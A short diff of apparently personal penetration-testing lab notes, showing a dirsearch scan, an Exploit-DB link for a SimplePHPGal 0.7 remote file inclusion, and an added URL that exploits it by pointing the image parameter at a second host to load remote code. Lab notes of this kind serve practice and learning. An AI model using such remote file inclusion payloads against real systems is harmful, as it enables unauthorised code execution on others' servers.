@@ -153,6 +153,7 @@ dirsearch -u http://192.168.230.58 -w /usr/share/seclists/Discovery/Web-Content/
 
 # SimplePHPGal 0.7 - Remote File Inclusion
 https://www.exploit-db.com/exploits/48424
+http://192.168.207.58/image.php?img=http://192.168.45.185/ㅐㅔㅗ
 ```
 ### Bratarina
 ```shell
